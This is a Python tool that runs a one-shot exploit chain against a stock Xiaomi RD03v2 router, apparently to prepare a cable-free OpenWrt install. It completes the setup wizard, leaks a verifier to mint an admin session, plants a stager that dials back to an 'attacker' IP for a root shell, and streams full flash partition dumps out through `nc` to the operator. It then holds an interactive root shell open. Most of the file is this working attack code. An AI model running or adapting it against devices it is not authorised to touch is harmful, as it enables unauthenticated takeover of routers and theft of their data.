#!/usr/bin/env python3
"""Fact-finding run against a stock RD03v2, over Wi-Fi, before anything is written.

This answers the questions that decide whether an unattended, cable-free
OpenWrt install is safe on this hardware.  It writes nothing to flash --
every command below is a read, and the UBI layout is recovered by dumping the
partition and parsing it here rather than by attaching it on the device.

  1. Does stock keep a second, idle kernel volume in `ubi_kernel`?
     If yes, the RAM initramfs can be written into the idle one with
     `ubiupdatevol`, leaving the running stock kernel intact and the
     bootloader's A/B failure counters as a real fallback.  If no, the
     installer has to `ubiformat` the only kernel partition on the device,
     and a torn write has nothing to fall back to.

  2. What flash-writing tools does stock userspace actually have?
     ubiformat/ubiupdatevol/fw_setenv decide whether the installer can work
     with what is on the box or has to push static ARM binaries first.

  3. Is `kexec` available?
     If it is, the OpenWrt kernel + initramfs can be test-booted straight
     from stock with zero NAND writes -- a full rehearsal (does the NAND chip
     probe? do the radios come up?) that a power cycle undoes.

Plus the pre-flight the installer will need every time: the NAND part number
(the ESMT/Winbond second-source that decides whether the release you are
about to flash can even see the flash), the partition map, and the U-Boot
environment.

Getting there costs the one-shot exploit: cap_init persists NETMODE=whc_cap,
so the sink is gated until a factory reset.  Reset the unit and re-run if a
probe goes wrong -- phases 1-4 leave nothing else behind.

Usage:
    python3 probe.py --device rd03v2 --host 192.168.31.1
    python3 probe.py --device rd03v2 --host 192.168.31.1 --skip-init
    python3 probe.py --device rd03v2 --skip-exploit       # stager already running
    python3 probe.py --device rd03v2 --print-stager       # show payload, exit
"""

import argparse
import hashlib
import json
import os
import re
import secrets
import shutil
import subprocess
import sys
import time

import chain
import channel
import devices
import ubiparse
from chain import ChainError, log

# ---- what we want off the device -------------------------------------------

# (key, description, command).  Read-only, every one of them.
FACTS = [
    ("uname",       "kernel",                "uname -a"),
    ("version",     "/proc/version",         "cat /proc/version"),
    ("cmdline",     "kernel cmdline",        "cat /proc/cmdline"),
    ("id",          "privilege",             "id"),
    ("model",       "board identity",
     "cat /proc/device-tree/model 2>/dev/null | tr -d '\\000'; echo; "
     "nvram get model 2>/dev/null; bdata get model 2>/dev/null; "
     "cat /etc/openwrt_release 2>/dev/null"),
    ("mtd",         "partition map",         "cat /proc/mtd"),
    ("mtd_sysfs",   "mtd geometry",
     "for d in /sys/class/mtd/mtd*; do case \"$d\" in *ro) continue;; esac; "
     "[ -f \"$d/name\" ] || continue; "
     "printf '%s name=%s size=%s erase=%s write=%s oob=%s type=%s\\n' "
     "\"${d##*/}\" \"$(cat $d/name)\" \"$(cat $d/size)\" \"$(cat $d/erasesize)\" "
     "\"$(cat $d/writesize)\" \"$(cat $d/oobsize 2>/dev/null)\" \"$(cat $d/type)\"; done"),
    ("nvram_nand",  "NAND per the bootloader",
     "for k in flash_type model flag_boot_rootfs SN; do "
     "printf '%-18s %s\\n' \"$k\" \"$(nvram get $k 2>/dev/null)\"; done"),
    ("nand_dmesg",  "NAND probe messages",
     "dmesg | grep -iE 'nand|spinand|spi_nand|manufact|qpic|serial flash|"
     "device id|jedec|ubi' | head -100"),
    ("dmesg_tail",  "recent kernel log",     "dmesg | tail -120"),
    ("ubi_runtime", "attached UBI at runtime",
     "cat /proc/mounts; echo '--- /sys/class/ubi:'; ls /sys/class/ubi 2>/dev/null; "
     "echo '--- ubinfo:'; ubinfo -a 2>&1 | head -80"),
    ("tools",       "flash + boot tooling",
     "for t in ubiformat ubiattach ubidetach ubinfo ubimkvol ubirmvol ubirsvol "
     "ubiupdatevol nandwrite nanddump flash_erase flashcp mtd mtd_debug fw_setenv "
     "fw_printenv nvram bdata kexec dropbear dropbearkey telnetd sftp-server scp "
     "openssl wget curl nc tar gzip md5sum sha256sum start-stop-daemon; do "
     "p=$(command -v $t 2>/dev/null); printf '%-16s %s\\n' \"$t\" \"${p:-MISSING}\"; done"),
    ("busybox",     "busybox applets",
     "busybox --list 2>/dev/null | tr '\\n' ' '; echo; busybox 2>&1 | tail -6"),
    ("fw_env",      "u-boot env access",
     "cat /etc/fw_env.config 2>/dev/null; echo '--- fw_printenv:'; "
     "fw_printenv 2>&1 | sort | head -60; echo '--- nvram show:'; "
     "nvram show 2>&1 | sort | head -80"),
    ("kexec",       "kexec support",
     "command -v kexec || echo 'kexec: MISSING'; "
     "ls -l /sys/kernel/kexec_loaded 2>&1; "
     "{ zcat /proc/config.gz 2>/dev/null || cat /proc/config 2>/dev/null; } "
     "| grep -i kexec || echo 'no /proc/config(.gz)'"),
    ("xiaoqiang",   "xiaoqiang uci",         "uci show xiaoqiang 2>&1 | head -60"),
    ("wireless",    "wireless uci",          "uci show wireless 2>&1 | head -80"),
    ("network",     "network uci",           "uci show network 2>&1 | head -60"),
    ("mem",         "memory",                "free; head -4 /proc/meminfo"),
    ("df",          "filesystems",           "df -h 2>&1 | head -20"),
    ("ps",          "processes",             "ps w 2>/dev/null | head -50 || ps | head -50"),
    ("listen",      "listening sockets",     "netstat -tlnp 2>/dev/null | head -30"),
    ("initd",       "init scripts",          "ls /etc/init.d"),
]

# Partitions worth having on the operator's disk before any install: the
# bootloader (the authority on how flag_boot_rootfs picks a system), its
# environment, the kernel UBI (the thing an installer would overwrite), and
# the per-device data that is not reproducible if it is ever lost.
DUMPS = [
    ("ubi_kernel", ["ubi_kernel", "kernel"]),
    ("appsbl",     ["0:APPSBL", "APPSBL", "uboot", "0:APPSBL_1"]),
    ("appsblenv",  ["0:APPSBLENV", "APPSBLENV", "u_env", "0:APPSBLENV_1"]),
    ("art",        ["0:ART", "ART", "art"]),
    ("bdata",      ["bdata", "0:BDATA"]),
]

# The second-source NAND.  Geometry does not discriminate -- the Winbond entry
# deliberately mirrors the 64-byte-spare ESMT layout -- so identification has
# to come from the part number or the raw ID in the boot log.
NAND_PARTS = [
    (r"F50D1G41LB",            "ESMT F50D1G41LB",   "c8 11", "supported since v1.0"),
    (r"F50L1G41LB",            "ESMT F50L1G41LB",   "c8 01", "different die from the "
                                                             "documented RD03v2 part"),
    (r"W25N01KW",              "Winbond W25N01KW",  "ef be 21",
     "NOT in v1.6 -- needs the 0413 spinand patch, i.e. v1.7 or a local build"),
    (r"W25N01G[VW]",           "Winbond W25N01GV/GW", "ef aa/ba 21", "not the documented part"),
    (r"\bef\s*be\s*21",        "Winbond W25N01KW (raw id)", "ef be 21",
     "NOT in v1.6 -- needs the 0413 spinand patch"),
    (r"0xc8.{0,24}0x11",       "ESMT F50D1G41LB (raw id)", "c8 11", "supported since v1.0"),
]


# ---- helpers ----------------------------------------------------------------


def parse_proc_mtd(text):
    """dev: size erasesize "name" -> {name: (index, size, erasesize)}."""
    out = {}
    for line in text.splitlines():
        m = re.match(r"mtd(\d+):\s+([0-9a-f]+)\s+([0-9a-f]+)\s+\"([^\"]+)\"", line.strip())
        if m:
            out[m.group(4)] = (int(m.group(1)), int(m.group(2), 16), int(m.group(3), 16))
    return out


def identify_nand(nand_text):
    hits = []
    for pat, name, ids, note in NAND_PARTS:
        if re.search(pat, nand_text, re.I):
            hits.append({"part": name, "id": ids, "note": note, "pattern": pat})
    return hits


def wifi_iface():
    try:
        out = subprocess.run(["nmcli", "-t", "-f", "DEVICE,TYPE", "dev"],
                             capture_output=True, text=True, timeout=5).stdout
        for line in out.splitlines():
            dev, _, typ = line.partition(":")
            if typ == "wifi":
                return dev
    except Exception:
        pass
    return None


def nmcli_connect(ssid, key):
    if not shutil.which("nmcli"):
        return False
    cmd = ["nmcli", "dev", "wifi", "connect", ssid]
    if key:
        cmd += ["password", key]
    log(f"[*] nmcli: joining {ssid!r}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        log(f"    {r.stdout.strip() or r.stderr.strip()}")
        return r.returncode == 0
    except Exception as e:                                       # noqa: BLE001
        log(f"    nmcli failed: {e}")
        return False


# ---- the run ----------------------------------------------------------------


def collect(ch, facts_path):
    """Run the battery, writing each answer out as it arrives.

    Incremental, because the exploit is one-shot: if the box wedges halfway
    through we keep whatever was already answered rather than losing the run.
    """
    facts = {}
    for key, desc, cmd in FACTS:
        try:
            rc, out = ch.run(cmd, timeout=120)
        except Exception as e:                                   # noqa: BLE001
            rc, out = -1, f"<failed: {type(e).__name__}: {e}>"
        facts[key] = {"description": desc, "command": cmd, "rc": rc, "output": out}
        with open(facts_path, "w") as fh:
            json.dump(facts, fh, indent=2)
    return facts


def pull(ch, sink, outdir, mtdmap, label, candidates, attacker, file_port,
         token):
    """Read a whole MTD partition back over the bulk channel.

    Three readers in preference order, because which of them exists is one of
    the things this run is here to find out.  nanddump skips bad blocks
    properly; dd with conv=noerror,sync keeps the offsets right when a read
    errors; cat is the last resort and simply stops short, which shows up as a
    size mismatch rather than as silently wrong data.
    """
    part = next((c for c in candidates if c in mtdmap), None)
    if part is None:
        log(f"[!] {label}: none of {candidates} in /proc/mtd -- skipped")
        return None
    idx, size, _erase = mtdmap[part]
    readers = [
        ("nanddump", f"nanddump --omitoob --bb=dumpbad -f - /dev/mtd{idx} 2>/dev/null"),
        ("dd", f"dd if=/dev/mtd{idx} bs=65536 conv=noerror,sync 2>/dev/null"),
        ("cat", f"cat /dev/mtd{idx} 2>/dev/null"),
    ]
    for name, reader in readers:
        log(f"[*] dumping {part} (mtd{idx}, {size} B) as {label}.bin via {name}")
        cmd = (f'({{ echo "AUTH {token}"; echo "FILE {label}.bin {size}"; '
               f'{reader}; }} '
               f'| nc {attacker} {file_port}) >/dev/null 2>&1 &')
        ch.run(cmd, timeout=30, retries=0, quiet=True)
        got, path = _await_file(sink, f"{label}.bin", size)
        if path is not None and got == size:
            with open(path, "rb") as fh:
                digest = hashlib.sha256(fh.read()).hexdigest()
            log(f"    sha256 {digest}")
            return {"partition": part, "mtd": idx, "size": size, "reader": name,
                    "path": path, "sha256": digest}
        log(f"[!] {label}: {name} produced {got}/{size} B -- trying the next reader")
    return None


def _await_file(sink, want_name, size):
    """Wait for a specific transfer; tolerate a stale entry from an earlier try."""
    deadline = time.time() + max(180, size // 20000)
    while time.time() < deadline:
        name, path, got, _want = sink.wait(timeout=max(60, deadline - time.time()))
        if name is None:
            return 0, None
        if name == want_name:
            return got, path
    return 0, None


def write_session_manifest(outdir, bind, peer, serve_port, shell_port,
                           file_port, token):
    path = os.path.join(outdir, "session.json")
    with open(path, "w") as output:
        json.dump({"bind": bind, "peer": peer, "serve_port": serve_port,
                   "shell_port": shell_port, "file_port": file_port,
                   "session_token": token}, output, indent=2)
        output.write("\n")
    os.chmod(path, 0o600)
    return path


def main():
    os.umask(0o077)
    ap = argparse.ArgumentParser(
        description="Read-only fact-finding run on a supported stock Xiaomi router.")
    devices.add_device_argument(ap)
    ap.add_argument("--host", default=None,
                    help="stock address (default: selected profile's address)")
    ap.add_argument("--attacker", default=None,
                    help="operator IP the device calls back to (auto-detected)")
    ap.add_argument("--serve-port", type=int, default=8000)
    ap.add_argument("--shell-port", type=int, default=4444)
    ap.add_argument("--file-port", type=int, default=4445)
    ap.add_argument("--id", default="ota0001", help="mesh peer identity (arbitrary)")
    ap.add_argument("--outdir", default=None)
    ap.add_argument("--skip-init", action="store_true",
                    help="unit is already INITTED and 19553 is open")
    ap.add_argument("--skip-exploit", action="store_true",
                    help="a stager from an earlier run is already dialling in")
    ap.add_argument("--print-stager", action="store_true")
    ap.add_argument("--settle", type=int, default=90,
                    help="seconds to let the AP repair itself before bulk work")
    ap.add_argument("--no-dumps", action="store_true",
                    help="facts only, skip the partition dumps")
    ap.add_argument("--no-hold", action="store_true",
                    help="exit when done instead of keeping the root shell open")
    ap.add_argument("--force", action="store_true",
                    help="continue past a hardware/ROM mismatch")
    ap.add_argument("--session-token", default=None,
                    help="token from the original run when using --skip-exploit")
    args = ap.parse_args()
    profile = devices.get_profile(args.device)
    args.host = args.host or profile.stock_host

    if args.print_stager:
        # Rendered against an unknown radio config, i.e. the "restore the AP to
        # open" fallback -- the shape is what matters here, not the values.
        print(channel.build_stager(
            args.attacker or "<operator-ip>", args.serve_port,
            args.shell_port, [], args.session_token or "TOKEN").decode())
        return 0

    stamp = time.strftime("%Y%m%d-%H%M%S")
    outdir = args.outdir or f"probe-{stamp}"
    os.makedirs(outdir, mode=0o700, exist_ok=True)
    os.chmod(outdir, 0o700)
    transcript = open(f"{outdir}/transcript.log", "w")
    chain.set_log_sink(transcript)
    log(f"[*] output -> {outdir}/")

    attacker = args.attacker or chain.local_ip(args.host)
    if not attacker:
        log("[-] could not work out which address the device would reach us on; "
            "pass --attacker")
        return 1
    token = args.session_token or secrets.token_hex(16)
    if args.skip_exploit and not args.session_token:
        log("[-] --skip-exploit requires the original --session-token")
        return 1
    session_path = write_session_manifest(
        outdir, attacker, args.host, args.serve_port, args.shell_port,
        args.file_port, token)
    log(f"[*] attachment session -> {session_path} (mode 0600)")

    result = {"host": args.host, "attacker": attacker, "when": stamp}

    # ---- phase 0: pre-flight, unauthenticated, zero footprint ---------------
    if not args.skip_exploit:
        log("\n=== pre-flight ===")
        info = chain.init_info(args.host)
        result["init_info"] = info
        log(f"[0] hardware={info.get('hardware')} rom={info.get('romversion')} "
            f"inited={info.get('inited')} model={info.get('model')}")
        identity_error = devices.stock_identity_error(profile, info)
        if identity_error:
            log(f"[-] {identity_error}")
            if not args.force:
                log("    re-run with --force if you know what you are doing")
                return 1

    # ---- phases 1-2: reach a cab_meshd CAP, then admin ----------------------
    stok = None
    if not args.skip_exploit:
        if not chain.port_open(args.host, chain.MESH_PORT):
            if args.skip_init:
                log(f"[-] tcp/{chain.MESH_PORT} closed but --skip-init was given")
                return 1
            log("\n=== phase 1: complete the wizard so cab_meshd starts ===")
            chain.initialise(args.host)
        else:
            log(f"[*] tcp/{chain.MESH_PORT} already open")

        log("\n=== phase 2: V1 -- leak the verifier, mint an admin session ===")
        stok, cfg = chain.admin_session(args.host, args.id.encode())
        result["sync_config_keys"] = sorted(cfg)

    # ---- build the payload around what the radios currently look like ------
    restore = []
    if stok:
        restore = chain.read_wifi(args.host, stok)
        result["wifi_before"] = restore
        for b in restore:
            log(f"[3] {b['ifname']}: ssid={b['ssid']!r} enc={b['encryption']!r} "
                f"chan={b['channel']}")

    stager = channel.build_stager(
        attacker, args.serve_port, args.shell_port, restore, token)
    if args.print_stager:
        print(stager.decode())
        return 0

    http = channel.StagerServer(
        attacker, args.serve_port, stager, token, args.host)
    ch = channel.ShellChannel(attacker, args.shell_port, token, args.host)

    # ---- phases 3-4: plant, then fire the one-shot -------------------------
    if not args.skip_exploit:
        log("\n=== phase 3: plant ===")
        chain.plant(args.host, stok, attacker, args.serve_port, restore,
                    http.stager_path)

        log("\n--- after the trigger the AP bounces; it comes back as: ---")
        for band, ssid, sec in channel.expected_wifi(restore):
            log(f"      {band}: ssid={ssid!r} {sec}")
        log(f"    this laptop must stay on {attacker} -- the payload dials that "
            "address and nothing else\n")

        log("=== phase 4: trigger (one-shot) ===")
        chain.trigger(args.host, args.id.encode())

        if http.callback.wait(timeout=45):
            result["callback"] = http.callback_path
        else:
            log("[!] no /pwned callback within 45s -- the Wi-Fi may already have "
                "dropped; the stager can still be running")

    # ---- phase 5: drive the root channel ------------------------------------
    log("\n=== phase 5: root channel ===")
    if not ch.wait(timeout=300):
        log("[-] no shell connection after 300s.")
        log("    if the AP came back, check this laptop rejoined and still holds "
            f"{attacker}; the stager retries every 5s forever")
        return 1

    rc, out = ch.run("id; uname -a", timeout=60)
    log(f"    {out}")
    result["whoami"] = out
    if "uid=0" not in out:
        log("[-] the channel is not root -- stopping")
        return 1

    now = chain.local_ip(args.host)
    if now and now != attacker:
        log(f"[!] this laptop is now {now}, not {attacker} that the payload dials.")
        log(f"    keep the old address alive:  sudo ip addr add {attacker}/24 dev "
            f"{wifi_iface() or '<wifi-iface>'}")

    if args.settle:
        log(f"[*] letting the AP settle for {args.settle}s before bulk work")
        time.sleep(args.settle)
        ch.run("echo settled", timeout=60)

    log("\n=== phase 6: facts ===")
    facts = collect(ch, f"{outdir}/facts.json")
    result["facts"] = {k: v["rc"] for k, v in facts.items()}

    mtdmap = parse_proc_mtd(facts.get("mtd", {}).get("output", ""))
    result["mtd"] = {k: {"index": v[0], "size": v[1], "erasesize": v[2]}
                     for k, v in mtdmap.items()}
    log(f"[*] {len(mtdmap)} MTD partitions: {', '.join(mtdmap)}")

    # ---- phase 7: pull the partitions that decide the install design -------
    dumps = {}
    if not args.no_dumps and mtdmap:
        log("\n=== phase 7: dumps ===")
        expected_files = {}
        for label, candidates in DUMPS:
            part = next((candidate for candidate in candidates if candidate in mtdmap), None)
            if part:
                expected_files[f"{label}.bin"] = mtdmap[part][1]
        sink = channel.FileSink(
            attacker, args.file_port, outdir, token, args.host, expected_files)
        for label, candidates in DUMPS:
            try:
                got = pull(ch, sink, outdir, mtdmap, label, candidates,
                           attacker, args.file_port, token)
            except Exception as e:                               # noqa: BLE001
                log(f"[!] {label}: {type(e).__name__}: {e}")
                got = None
            if got:
                dumps[label] = got
    result["dumps"] = dumps

    # ---- phase 8: read the kernel UBI here, not on the device --------------
    ubi_report = None
    if "ubi_kernel" in dumps:
        log("\n=== phase 8: kernel UBI layout ===")
        try:
            data = open(dumps["ubi_kernel"]["path"], "rb").read()
            erase = mtdmap.get("ubi_kernel", (0, 0, 131072))[2] or 131072
            img = ubiparse.UbiImage(data, peb_size=erase)
            ubi_report = img.report()
            print(ubi_report)
            transcript.write(ubi_report + "\n")
            vols = []
            for vid in sorted(img.volumes):
                v = img.volumes[vid]
                blob = img.extract(vid) if v.lebs else b""
                vols.append({
                    "id": vid, "name": v.name, "type": v.type_name,
                    "reserved_pebs": v.reserved_pebs, "mapped_lebs": len(v.lebs),
                    "bytes": len(blob),
                    "head": blob[:4].hex(),
                    "is_fit": blob[:4] == bytes.fromhex("d00dfeed"),
                    "md5": hashlib.md5(blob).hexdigest() if blob else None,
                })
                if blob:
                    with open(f"{outdir}/ubi_kernel.vol-{v.name or vid}.bin", "wb") as fh:
                        fh.write(blob)
            result["ubi_kernel_volumes"] = vols
            with open(f"{outdir}/ubi_kernel.report.txt", "w") as fh:
                fh.write(ubi_report + "\n")
        except Exception as e:                                   # noqa: BLE001
            log(f"[!] UBI parse failed: {type(e).__name__}: {e}")

    # ---- verdicts -----------------------------------------------------------
    # The bootloader already identified the part and left it in the U-Boot
    # environment. Prefer that: dmesg wraps, and on a unit that has been up a
    # while the probe lines are long gone (which is exactly what happened on
    # the first real run).
    nand_hits = identify_nand(facts.get("nand_dmesg", {}).get("output", ""))
    ft = re.search(r"flash_type\s+(\S+)",
                   facts.get("nvram_nand", {}).get("output", ""))
    if ft:
        code = ft.group(1).lower().removeprefix("0x").zfill(2)
        part = profile.flash_types.get(code)
        result["flash_type"] = code
        if part:
            nand_hits.insert(0, {"part": part, "id": f"dev 0x{code}",
                                 "note": "from nvram flash_type (bootloader ID table)",
                                 "pattern": "nvram"})
        else:
            nand_hits.append({"part": f"UNKNOWN (flash_type 0x{code})",
                              "id": f"dev 0x{code}",
                              "note": "not in the bootloader ID table decoded from 0:APPSBL",
                              "pattern": "nvram"})
    result["nand"] = nand_hits

    with open(f"{outdir}/result.json", "w") as fh:
        json.dump(result, fh, indent=2, default=str)
    write_report(outdir, result, facts, ubi_report)

    log("\n" + "=" * 68)
    log("  verdicts")
    log("=" * 68)

    if nand_hits:
        for h in nand_hits:
            log(f"  NAND: {h['part']}  (id {h['id']}) -- {h['note']}")
    else:
        log("  NAND: NOT IDENTIFIED from the boot log. Do not flash on this "
            "evidence; see facts.json nand_dmesg/dmesg_tail.")

    vols = result.get("ubi_kernel_volumes") or []
    kernels = [v for v in vols if v["is_fit"]]
    named = [v["name"] for v in vols if v["name"]]
    if vols:
        log(f"  ubi_kernel volumes: {named or '(none in the table)'}")
        log(f"  bootable (FIT d00dfeed) volumes: "
            f"{[v['name'] for v in kernels] or 'none'}")
        if len(kernels) >= 2 or len(named) >= 2:
            log("  -> a second kernel volume exists: the installer can "
                "ubiupdatevol the idle one and keep stock bootable")
        else:
            log("  -> single kernel volume: any install overwrites the only "
                "bootable system. Prefer the kexec rehearsal, and take a full "
                "NAND backup first.")
    else:
        log("  ubi_kernel: not dumped or not parseable")

    tools = facts.get("tools", {}).get("output", "")
    missing = [ln.split()[0] for ln in tools.splitlines() if "MISSING" in ln]
    log(f"  tools missing on stock: {', '.join(missing) or 'none'}")
    kx = facts.get("kexec", {}).get("output", "")
    log(f"  kexec: {'available' if 'CONFIG_KEXEC=y' in kx and 'MISSING' not in kx else 'see facts.json'}")

    log("")
    log(f"  full report: {outdir}/report.md")
    log("  the one-shot is spent: factory-reset the unit to re-arm cap_init.")
    log("  nothing was written to flash by this run.")

    if not args.no_hold:
        hold(ch, outdir)
    return 0


def hold(ch, outdir):
    """Keep the root shell alive for ad-hoc questions.

    Worth doing by default: the trigger is one-shot, so exiting here costs a
    factory reset and a full re-run to ask one more question.  The channel
    itself does not survive a reboot of the device -- the stager lives in
    /tmp -- so this is the whole window.
    """
    log("\n" + "=" * 68)
    log("  root shell held open -- type commands, or 'quit'")
    log(f"  everything here is appended to {outdir}/adhoc.log")
    log("=" * 68)
    with open(f"{outdir}/adhoc.log", "a") as fh:
        while True:
            try:
                cmd = input("rd03v2# ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if cmd in ("quit", "exit"):
                break
            if not cmd:
                continue
            try:
                rc, out = ch.run(cmd, timeout=180, quiet=True)
            except Exception as e:                               # noqa: BLE001
                rc, out = -1, f"<{type(e).__name__}: {e}>"
            print(out)
            if rc:
                print(f"[rc={rc}]")
            fh.write(f"$ {cmd}\n{out}\n[rc={rc}]\n")
            fh.flush()
    log("[*] channel released (the stager keeps dialling until the box reboots)")


def write_report(outdir, result, facts, ubi_report):
    lines = [
        f"# RD03v2 probe -- {result['when']}",
        "",
        f"- target `{result['host']}`, operator `{result['attacker']}`",
        f"- init_info: `{json.dumps(result.get('init_info', {}))}`",
        f"- root callback: `{result.get('callback')}`",
        "",
        "Read-only run: no flash writes, UBI parsed from a dump rather than attached.",
        "",
        "## NAND",
        "",
    ]
    if result.get("nand"):
        for h in result["nand"]:
            lines.append(f"- **{h['part']}** (id `{h['id']}`) -- {h['note']}")
    else:
        lines.append("- **not identified** from the boot log -- do not flash on this evidence")
    lines += ["", "```", facts.get("nand_dmesg", {}).get("output", "")[:4000], "```", ""]

    lines += ["## Partitions", "", "```", facts.get("mtd", {}).get("output", ""), "```", ""]
    if ubi_report:
        lines += ["## ubi_kernel volumes", "", "```", ubi_report, "```", ""]
        for v in result.get("ubi_kernel_volumes", []):
            if v["bytes"]:
                lines.append(f"- `{v['name']}` id={v['id']} {v['type']} "
                             f"{v['bytes']} B head=`{v['head']}` "
                             f"{'**bootable FIT**' if v['is_fit'] else ''} md5=`{v['md5']}`")
        lines.append("")

    lines += ["## Tooling", "", "```", facts.get("tools", {}).get("output", ""), "```",
              "", "## kexec", "", "```", facts.get("kexec", {}).get("output", ""), "```",
              "", "## U-Boot environment", "", "```",
              facts.get("fw_env", {}).get("output", "")[:6000], "```", ""]

    if result.get("dumps"):
        lines += ["## Dumps", ""]
        for label, d in result["dumps"].items():
            lines.append(f"- `{label}.bin` <- {d['partition']} (mtd{d['mtd']}, "
                         f"{d['size']} B) sha256 `{d['sha256']}`")
        lines.append("")

    with open(f"{outdir}/report.md", "w") as fh:
        fh.write("\n".join(lines) + "\n")


if __name__ == "__main__":
    try:
        sys.exit(main())
    except ChainError as e:
        log(f"[-] {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        log("\n[*] interrupted")
        sys.exit(130)
